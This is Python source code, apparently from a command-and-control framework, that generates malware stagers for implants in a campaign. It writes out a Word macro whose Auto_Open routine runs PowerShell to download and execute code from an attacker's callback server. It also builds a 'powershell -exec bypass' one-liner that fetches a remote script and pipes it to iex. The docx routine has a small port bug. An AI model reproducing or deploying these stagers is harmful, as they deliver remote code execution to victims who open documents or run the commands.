class StagerGeneration():
    # TODO: This needs cleaned up to ensure expandability with database changes.

    db = None
    def __init__(self, db_pointer):
        self.db = db_pointer

    def GenerateStaticStagers(self,cid, user):
        ret_data = {}
        if self.db.Verify_UserCanAccessCampaign(user,cid):
            ImplantInfo = self.db.Get_AllImplantBaseFromCid(cid)
            if ImplantInfo != False:
                for implant in ImplantInfo:
                    ret_data[implant['title']]={
                        "description":implant['description'],
                        "url":implant['callback_url'],
                        "powershell_stager":self.__generate_powershell_stager_string(implant),
                        #"htts_powershell_stager": self.__generate_https_powershell_stager_string(implant),
                        "docm_macro_stager":self.__generate_docx_stager_string(implant),
                        "stager_key":implant['stager_key']}
            return ret_data
        else:
            return ret_data

    def GenerateSingleStagerFile(self,cid,user,stager_type):
        # TODO: Create docx file download from template.
        #   users can currently use the docx stager string as a replacement.
        if self.db.Verify_UserCanAccessCampaign(user,cid):

            if stager_type == "docx":
                return self.__generate_docx_stager_file()
            return
        else:
            return False


    def __generate_docx_stager_string(self, implant_data):

        if implant_data['comms_https'] == 1:
            http_proto = "https"
            port = implant_data['comms_https']
        else:
            http_proto = "http"
            port = implant_data['comms_https']
        stager_string = '''Sub Auto_Open()
Dim exec As String
exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('{}://{}:{}/robots.txt?user={}'))"""
Shell (exec)
End Sub
:return:'''.format(http_proto,implant_data['callback_url'], str(port), implant_data['stager_key'])

        return stager_string


    def __generate_powershell_stager_string(self, implant_data):
        # print(implant_data)
        if implant_data['comms_https'] == 1:
            http_proto = "https"
            port = implant_data['comms_https']
        else:
            http_proto = "http"
            port = implant_data['comms_http']
        # -- Old method, not used, but will keep for reference.
        # stager_string = "powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://" + \
        #                 implant_data['callback_url'] + ":" + str(implant_data['port']) + "/robots.txt?user=" + implant_data[
        #                     'stager_key'] + "')|iex"
        stager_string = "powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{}://{}:{}/robots.txt?user={}')|iex\"".format(
            http_proto,
            implant_data['callback_url'],
            port,
            implant_data['stager_key'])
        return stager_string